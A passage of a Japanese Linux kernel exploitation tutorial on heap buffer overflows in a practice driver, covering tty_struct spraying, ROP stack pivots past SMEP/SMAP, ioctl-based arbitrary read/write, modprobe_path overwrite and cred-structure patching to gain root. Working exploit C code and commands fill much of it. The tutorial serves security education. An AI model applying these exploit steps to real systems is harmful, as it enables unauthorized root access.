+<p>また、今回は<code>ioctl</code>を使いましたが、0xffffffffdead00c0でクラッシュしているので、<code>ioctl</code>に対応する関数ポインタは0xC(=12)番目にあることも分かりました。</p>
+<h3><span id="smepの回避stack-pivot">SMEPの回避：Stack Pivot</span></h3>
+<p>前回Stack Overflowの時と同様に、RIPが取れたらROPでSMEPが回避できます。SMEPが無い場合は当然ret2usrで良いですが、SMEPを回避するだけなら例えば次のようなgadgetが使えます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81516264: mov esp, 0x39000000; ret;</span><br></pre></td></tr></table></figure>
+<p>あらかじめユーザー空間の0x39000000をmmapで確保してROP chainを書き込んでおき、上記gadgetを呼び出すとstack pivotとしてユーザー空間に設置したROP chainが走ります。<br>
+しかし今回はSMAPが有効なのでユーザー空間に置いたROP chainは実行できません。幸いにも制御可能なカーネル空間（ヒープ）のアドレスを知っているので、偽の関数テーブルと一緒にヒープ上にROP chainを書き込んで、それを実行させましょう。</p>
+<p>ヒープ上のROP chainを実行するにはスタックポインタrspをヒープのアドレスに持ってくる必要があります。先程例で</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(spray[i], <span class="number">0xdeadbeef</span>, <span class="number">0xcafebabe</span>);</span><br></pre></td></tr></table></figure>
+<p>を実行しましたが、このときのクラッシュメッセージを見直してみると、次のように<code>ioctl</code>の引数が一部レジスタに入っていることが分かります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RCX: 00000000deadbeef</span><br><span class="line">RDX: 00000000cafebabe</span><br><span class="line">RSI: 00000000deadbeef</span><br><span class="line">R08: 00000000cafebabe</span><br><span class="line">R12: 00000000deadbeef</span><br><span class="line">R14: 00000000cafebabe</span><br></pre></td></tr></table></figure>
+<p>つまり、<code>ioctl</code>の引数にROP chainのアドレスを渡し、<code>mov rsp, rcx; ret;</code>のようなgadgetを呼べばROPできると分かります。</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="オオカミくん"></div>
+  <p class="says">
+    <code>write</code>や<code>read</code>の引数は、バッファのアドレスがユーザーランドの範囲か確認されたり、サイズが大きすぎるとハンドラが呼ばれなかったりして、カーネルヒープへのstack pivotには使えないことが多いよ。
+  </p>
+</div>
+<p>いくらカーネルとはいえ<code>mov rsp, rcx; ret;</code>のような愚直なgadgetは見つかりにくいですが、<code>push rcx; ...; pop rsp; ...; ret;</code>のようなgadgetは高確率で存在するので、この形を探すと見つかりやすいかもしれません。今回は次のgadgetを使います。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;</span><br></pre></td></tr></table></figure>
+<p>ひとまずROP chainに到達しているかを確認しましょう。以下の例ではROP chainの0xffffffffdeadbeefでクラッシュすれば成功です。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 偽関数テーブルの書き込み</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf;</span><br><span class="line">p[<span class="number">12</span>] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ROP chainの用意</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">0xffffffffdeadbeef</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// RIPの制御</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  ioctl(spray[i], <span class="number">0xdeadbeef</span>, g_buf - <span class="number">0x10</span>); <span class="comment">// r13, rbpの分を引いた</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3><span id="権限昇格">権限昇格</span></h3>
+<p>さて、あとはROPをするだけなのですが、今<code>p[12]</code>は関数ポインタに使ってしまっているので、そこだけpopなどでスキップしてあげましょう。あるいは、関数テーブルを<code>ops</code>の後ろに持ってきて<code>g_buf</code>はROP chain専用にするなどでも構いません。</p>
+<p>自分の好きな方法でROPを書いてみましょう。ROPが正しく動けば、KASLR,SMAP,SMEP,KPTIすべて有効でも権限昇格できるはずです。<br>
+exploitの例は<a href="exploit/heapbof-krop.c">ここ</a>からダウンロードできます。</p>
+<center>
+  <img src="img/hbof_privesc.png" alt="権限昇格に成功した様子" style="width:320px;">
+</center>
+<h2><span id="aaraawによるexploit">AAR/AAWによるExploit</span></h2>
+<p>先程の例では<code>push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;</code>というstack pivotのgadgetを利用しました。自分でgadgetを探した人も、比較的複雑なgadgetしか見つからなかったかと思います。今回のように1回のRIP制御でstack pivotができるgadgetが必ず存在するとは限りません。stack pivotが出来ない場合はどうすれば良いでしょうか。</p>
+<p>このような状況でも、高い確率で見つかるgadgetを利用して安定したexploitを書く<a target="_blank" rel="noopener" href="https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html">手法</a>があります。あらためてRIPを制御した際のレジスタの様子を見てみます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ioctl(spray[i], 0xdeadbeef, 0xcafebabe);</span><br><span class="line"></span><br><span class="line">RCX: 00000000deadbeef</span><br><span class="line">RDX: 00000000cafebabe</span><br><span class="line">RSI: 00000000deadbeef</span><br><span class="line">R08: 00000000cafebabe</span><br><span class="line">R12: 00000000deadbeef</span><br><span class="line">R14: 00000000cafebabe</span><br></pre></td></tr></table></figure>
+<p>今回は関数ポインタの書き換え、すなわち<code>call</code>命令でRIPを制御しているため、<code>ret</code>で終わる命令にジャンプすれば問題なく<code>ioctl</code>の処理が終了してユーザーランドに戻ってきます。では、次のようなgadgetを呼び出すと何ができるでしょうか。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff810477f7: mov [rdx], rcx; ret;</span><br></pre></td></tr></table></figure>
+<p>今rdxもecxも制御可能なので、このgadgetを呼び出せば任意のアドレスに任意の4バイトの値を書き込むことができます。このようなmov gadgetはかなり高い確率で存在します。つまり、関数ポインタによるRIP制御ができる状況ではAAW primitiveが作れるのです。<br>
+では、次のgadgetの場合はどうでしょうか。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8118a285: mov eax, [rdx]; ret;</span><br></pre></td></tr></table></figure>
+<p>この場合、任意のアドレスに書かれた4バイトの値を<code>ioctl</code>の戻り値として得られます。（<code>ioctl</code>の戻り値はint型なので1度に4バイトまで取得可能。）AAR primitiveも作れることが分かりました。</p>
+<p>では、カーネル空間で任意アドレス読み書きがあるとき、何ができるのでしょうか？</p>
+<h3><span id="modprobe_pathとcore_pattern">modprobe_pathとcore_pattern</span></h3>
+<p>Linuxカーネルに何かしらの処理の以来があったとき、カーネルからユーザー空間のプログラムを起動させたいことがあります。このようなとき、Linuxでは<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/umh.c#L474"><code>call_usermodehelper</code></a>という関数が使われます。<code>call_usermodehelper</code>が使われる処理はいくつかありますが、ユーザー空間から特権なしで呼び出せる代表的なパスとして、<code>modprobe_path</code>と<code>core_pattern</code>があります。</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L61"><code>modprobe_path</code></a>は<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/kmod.c#L170"><code>__request_module</code></a>という関数から呼び出されるコマンド文字列で、書き換え可能領域に存在します。<br>
+Linuxには実行ファイル形式が複数共存しており、実行権限のあるファイルが実行されるとファイルの先頭のバイト列などから形式を判別します。標準ではELFファイルとshebangが登録されているのですが、このように登録されている形式にマッチしない不明な実行ファイルが呼び出されようとしたとき、<code>__request_module</code>が使われます。<code>modprobe_path</code>には標準で<code>/sbin/modprobe</code>が書かれており、これを書き換えた上で不正な形式の実行ファイルを起動しようとすると、任意のコマンドが実行できます。</p>
+<p>同様にカーネルから実行されるコマンドに<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L57"><code>core_pattern</code></a>があります。<code>core_pattern</code>は、ユーザー空間のプログラムがクラッシュした時に<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/fs/coredump.c#L577"><code>do_coredump</code></a>から呼び出されるコマンド文字列です。正確には<code>core_pattern</code>の文字列がパイプ文字<code>|</code>から始まる際に、続くコマンドが起動します。例えばUbuntu 20.04では標準で次のようなコマンドが使われます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|/usr/share/apport/apport %p %s %c %d %P %E</span><br></pre></td></tr></table></figure>
+<p>コマンドが設定されていない場合は、単に<code>core</code>という文字列が入っています。（これがコアダンプの名前になります。）<code>core_pattern</code>をAAWで書き換えれば、ユーザー空間のプログラムがクラッシュした際に特権で外部プログラムを呼び出せるため、わざとクラッシュするプログラムを実行すれば権限昇格できます。</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="オオカミくん"></div>
+  <p class="says">
+    変数のアドレスはFGKASLRの影響を受けないから、FGKASLRが有効な場合でも使えそうだね。
+  </p>
+</div>
+<p>今回は、<code>modprobe_path</code>を書き換えることで権限昇格してみましょう。まず<code>modprobe_path</code>の場所を探す必要がありますが、シンボル情報がある場合はkallsyms等から見つけてください。今回のカーネルではシンボル情報を残していないので自分で特定する必要があります。<code>core_pattern</code>のときも同様ですが、vmlinuxから文字列を見つける方法が最も簡単でしょう。<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">&gt;&gt;&gt; from ptrlib import ELF</span><br><span class="line">&gt;&gt;&gt; kernel = ELF(&quot;./vmlinux&quot;)</span><br><span class="line">&gt;&gt;&gt; hex(next(kernel.search(&quot;/sbin/modprobe\0&quot;)))</span><br><span class="line">0xffffffff81e38180</span><br></pre></td></tr></table></figure>
+<p>gdbで確認すると、確かに<code>/sbin/modprobe</code>が存在することが分かります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/1s 0xffffffff81e38180</span><br><span class="line">0xffffffff81e38180:     &quot;/sbin/modprobe&quot;</span><br></pre></td></tr></table></figure>
+<p>アドレスが分かったのでAAWで書き換えてみましょう。安定したAAR/AAWがあるときは関数として呼び出せるようにexploitを設計すると便利です。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AAW32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf;</span><br><span class="line">  p[<span class="number">12</span>] = rop_mov_prdx_rcx;</span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line">  write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mov [rdx], rcx; ret;</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    ioctl(spray[i], val <span class="comment">/* rcx */</span>, addr <span class="comment">/* rdx */</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">char</span> cmd[] = <span class="string">&quot;/tmp/evil.sh&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cmd); i += <span class="number">4</span>) &#123;</span><br><span class="line">    AAW32(addr_modprobe_path + i, *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)&amp;cmd[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>上の例では、不明な形式の実行ファイルが実行されようとした際に<code>/tmp/evil.sh</code>が呼ばれることになります。したがって、<code>/tmp/evil.sh</code>には実行したい処理を書きます。今回は次のスクリプトを用意しました。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">chmod -R 777 /root</span><br></pre></td></tr></table></figure>
+<p>最後に適当な実行ファイルを用意して実行すれば完了です。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -e &#x27;#!/bin/sh\nchmod -R 777 /root&#x27; &gt; /tmp/evil.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/evil.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -e &#x27;\xde\xad\xbe\xef&#x27; &gt; /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/tmp/pwn&quot;</span>); <span class="comment">// modprobe_pathの呼び出し</span></span><br></pre></td></tr></table></figure>
+<p>exploitが成功すると、任意のコマンドがroot権限で実行できたことが分かります。</p>
+<center>
+  <img src="img/hbof_modprobe_path.png" alt="modprobe_pathによる権限昇格" style="width:400px;">
+</center>
+<p>このexploitは<a href="exploit/heapbof-aaw.c">ここ</a>からダウンロードできます。</p>
+<h3><span id="cred構造体">cred構造体</span></h3>
+<p><a href="stack_overflow.html">前章</a>で説明したように、プロセスの権限は<code>cred</code>構造体で管理されています。<code>cred</code>構造体にはそのプロセスの実効ユーザーIDなどが記載されているため、自分のプロセスの<code>cred</code>構造体の各種IDをroot（=0）に書き換えれば権限昇格できます。では、どのようにして自プロセスの<code>cred</code>構造体のアドレスを取得するのでしょうか。</p>
+<p>古いLinuxカーネルの場合、<code>current_task</code>というグローバルなシンボルがあり、ここに現在のコンテキストのプロセスの<code>task_struct</code>構造体へのポインタが記載されていました。そのため、AAR/AAWを持っているときは<code>task_struct</code>から<code>cred</code>を辿り、簡単に権限昇格できたのです。<br>
+しかし、最近のバージョンでは<code>current_task</code>はグローバルな変数としては廃止され、代わりにCPUごとの空間に保存されており、gsレジスタを使ってアクセスするようになっています。そのためプロセスの<code>cred</code>構造体を直接見つけることはできないのですが、AARを持っている時は比較的簡単に実現できます。カーネルのヒープ領域はそこまで広くないため、Kernel Exploitではヒープを全探索して<code>cred</code>構造体を見つけられます。今回ヒープのアドレスを既に知っているためこれが実現可能です。つまり、次のようなコードで権限昇格ができます。（今回は<code>ioctl</code>で1度に最大4バイト読めるので、4バイトごと調べています。）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (u64 p = heap_address; ; p += <span class="number">4</span>) &#123;</span><br><span class="line">  u32 leak = AAR_32bit(p); <span class="comment">// AAR</span></span><br><span class="line">  <span class="keyword">if</span> (looks_like_cred(leak)) &#123; <span class="comment">// cred構造体っぽい</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p + XXX, <span class="number">0</span>, YYY); <span class="comment">// 実効UIDの書き換え</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>問題はどのようにして自分のプロセスのcred構造体を見つけるかです。ここで<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/sched.h#L723"><strong>task_struct構造体</strong></a>のメンバを再び見てみます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="comment">/* Cached requested key. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>			*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * executable name, excluding path.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">	 * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">	 * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注目して欲しいのは<code>comm</code>という変数です。ここにはプロセスの実行ファイルの名前が最大16バイト保存されます。この値は<code>prctl</code>の<code>PR_SET_NAME</code>フラグで変更できます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux 2.6.9)</span><br><span class="line">    Set  the name of the calling thread, using the value in the location pointed to by (char *) arg2.  The name can be up to 16 bytes long, including the terminating null byte.  (If the</span><br><span class="line">    length of the string, including the terminating null byte, exceeds 16 bytes, the string is silently truncated.)  This is the same attribute that can be set via pthread_setname_np(3)</span><br><span class="line">    and retrieved using pthread_getname_np(3).  The attribute is likewise accessible via /proc/self/task/[tid]/comm, where tid is the name of the calling thread.</span><br></pre></td></tr></table></figure>
+<p>したがって、カーネル中になさそうな文字列を<code>comm</code>に設定し、それをAARで探せば良い訳です。<code>task_struct</code>構造体の定義を見ると<code>comm</code>の前に<code>cred</code>構造体へのポインタがあるので、ここから自分のプロセスの権限情報を書き換えられます。</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="オオカミくん"></div>
+  <p class="says">
+    この方法はAAR/AAWさえ持っていればROP gadgetや関数のオフセットに依存しないexploitが書けるから、いろんな環境で安定して動くexploitを書きたい場合には便利だね。
+  </p>
+</div>
+<p>原理が分かったところで、実際にこの手法で権限昇格を実装してみましょう。AARは愚直に実装しても構いませんが、今回のように大量に呼び出す際に毎回sprayした<code>tty_struct</code>のすべてを試すのは時間がかかるので、初回呼び出しでfdをキャッシュするようにしました。また、ROP gadgetを書き込む<code>write</code>も初回だけで良いので、2回目以降は呼び出さないことで大幅にexploitを高速化できます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cache_fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">AAR32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (cache_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf;</span><br><span class="line">    p[<span class="number">12</span>] = rop_mov_eax_prdx;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line">    write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mov eax, [rdx]; ret;</span></span><br><span class="line">  <span class="keyword">if</span> (cache_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">int</span> v = ioctl(spray[i], <span class="number">0</span>, addr <span class="comment">/* rdx */</span>);</span><br><span class="line">      <span class="keyword">if</span> (v != <span class="number">-1</span>) &#123;</span><br><span class="line">        cache_fd = spray[i];</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(cache_fd, <span class="number">0</span>, addr <span class="comment">/* rdx */</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>次に、<code>task_struct</code>がヒープ上のどこに存在するか分からないので、<code>g_buf</code>のアドレスよりもかなり前から探索するようにしましょう。gdbで確認したところ0x200000程度前に存在しましたが、環境やヒープの使用状況により異なるため幅は大きく持たせます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task_structの探索</span></span><br><span class="line"><span class="keyword">if</span> (prctl(PR_SET_NAME, <span class="string">&quot;nekomaru&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">  fatal(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line"><span class="keyword">for</span> (addr = g_buf - <span class="number">0x1000000</span>; ; addr += <span class="number">0x8</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((addr &amp; <span class="number">0xfffff</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;searching... 0x%016lx\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (AAR32(addr) == <span class="number">0x6f6b656e</span></span><br><span class="line">      &amp;&amp; AAR32(addr+<span class="number">4</span>) == <span class="number">0x7572616d</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found &#x27;comm&#x27; at 0x%016lx\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>comm</code>の場所が分かったら、直前の<code>cred</code>を書き換えましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr_cred = <span class="number">0</span>;</span><br><span class="line">addr_cred |= AAR32(addr - <span class="number">8</span>);</span><br><span class="line">addr_cred |= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)AAR32(addr - <span class="number">4</span>) &lt;&lt; <span class="number">32</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] current-&gt;cred = 0x%016lx\n&quot;</span>, addr_cred);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 実効IDの上書き</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">  AAW32(addr_cred + i*<span class="number">4</span>, <span class="number">0</span>); <span class="comment">// id=0(root)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] pwned!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>次のように権限昇格できていれば成功です。</p>
+<center>
+  <img src="img/hbof_cred.png" alt="cred構造体の書き換えによる権限昇格" style="width:400px;">
+</center>
+<p>この章ではカーネル空間におけるHeap Overflow脆弱性の攻撃方法を学びました。実は、ここまでの知識があればほとんどの脆弱性を攻撃できます。次章ではカーネル空間でのUse-after-Freeを扱いますが、たいていの脆弱性は最終的にkROPやAAR/AAWに着地するため、やることはほとんど同じです。</p>
+<hr>
+<div class="column" title="例題">
+  この章では<code>modprobe_path</code>を書き換えてroot権限でコマンドを実行しました。<br>
+  (1) <code>core_pattern</code>を書き換えて同様にroot権限を取ってください。<br>
+  (2) <code>orderly_poweroff</code>や<code>orderly_reboot</code>などの関数では、それぞれ<code>poweroff_cmd</code>や<code>reboot_cmd</code>のコマンドが<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/reboot.c#L462">実行されます</a>。このコマンドを書き換えてから、RIP制御でこの関数を呼ぶことでroot権限のシェルを取ってください。<br>
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>オブジェクトのサイズはカーネルのバージョンによって変わる可能性があるので注意しましょう。 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
